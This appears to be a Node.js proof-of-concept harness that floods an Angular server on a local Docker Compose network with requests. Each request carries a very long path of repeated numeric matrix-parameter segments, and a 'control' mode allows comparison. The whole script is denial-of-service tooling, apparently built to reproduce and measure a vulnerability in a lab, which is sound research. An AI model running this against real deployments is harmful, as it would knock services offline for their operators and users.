// Reaches Angular directly on the Compose network. Nginx never sees the request,
// so the only ceiling is Node's own --max-http-header-size.
import http from "node:http";

const target = new URL(process.env.TARGET_URL ?? "http://app:4000");
const SEGMENTS = Object.freeze({
  candidate: "/a;990;2522",
  control: "/a;aaa;bbbb",
});

const mode = process.env.MODE ?? "candidate";
if (!Object.hasOwn(SEGMENTS, mode)) {
  throw new Error(`Unsupported MODE=${mode}. Expected "candidate" or "control".`);
}

const segmentsPerRequest = Number(process.env.SEGMENTS ?? "1488");
const concurrency = Number(process.env.CONCURRENCY ?? "6");
if (!Number.isSafeInteger(segmentsPerRequest) || segmentsPerRequest <= 0) {
  throw new Error(`SEGMENTS must be a positive integer; received ${process.env.SEGMENTS}.`);
}
if (!Number.isSafeInteger(concurrency) || concurrency <= 0) {
  throw new Error(`CONCURRENCY must be a positive integer; received ${process.env.CONCURRENCY}.`);
}

const path = SEGMENTS[mode].repeat(segmentsPerRequest);
const pathBytes = Buffer.byteLength(path);
const agent = new http.Agent({ keepAlive: false, maxSockets: concurrency });

console.log(
  JSON.stringify({
    mode,
    transport: "node:http (direct, no proxy)",
    destination: target.origin,
    segmentsPerRequest,
    concurrency,
    pathBytes,
  }),
);

function sendRequest(index) {
  return new Promise((resolve) => {
    const req = http.request(
      { host: target.hostname, port: target.port, path, method: "GET", agent },
      (res) => {
        let bytes = 0;
        res.on("data", (chunk) => {
          bytes += chunk.length;
        });
        res.on("end", () => resolve({ index, status: res.statusCode, bytes }));
      },
    );
    req.on("error", (error) => resolve({ index, error: error.code ?? error.message }));
    req.end();
  });
}

const results = await Promise.all(
  Array.from({ length: concurrency }, (_, index) => sendRequest(index)),
);

console.log(JSON.stringify({ mode, pathBytes, concurrency, results }));
